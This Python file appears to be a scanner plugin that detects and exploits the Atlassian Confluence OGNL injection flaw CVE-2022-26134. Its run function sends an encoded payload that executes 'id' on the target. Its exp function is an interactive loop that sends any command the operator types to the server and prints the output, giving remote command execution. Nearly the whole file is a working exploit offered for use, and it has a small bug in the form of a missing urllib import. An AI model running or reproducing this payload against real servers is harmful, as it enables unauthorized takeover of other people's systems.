#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/L9zZdynW5bRaGESapw0oeA',

      'huixian'   :  '存在可利用exp函数',

      'method'    :   'get',

      'bugname'   :   'Atlassian Confluence 远程代码执行 CVE-2022-26134',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': '*/*',
      }
  cmd = 'id'
  target = '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22' + cmd + '%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 302 and "uid" in res.headers['X-Cmd-Response'] and "gid" in res.headers['X-Cmd-Response'] and "groups" in res.headers['X-Cmd-Response']:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret
def exp(url):
  headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
    }
  print('[+] 开始执行命令(输入exit退出)!')
  cmd = ''
  try:
    while cmd != 'exit':
      cmd = input('[+]输入命令 >')
      try:
        vurl = urllib.parse.urljoin(url, '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22' + cmd + '%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/')
        rep = requests.get(vurl, headers=headers, verify=False, allow_redirects=False, timeout=3)
        if rep.status_code == 302:
          output = rep.headers['X-Cmd-Response']
          print('[+] 执行结果: ', output)
      except:
        print('[+] 执行超时，请检查是否成功?')
    return True
  except:
    return False


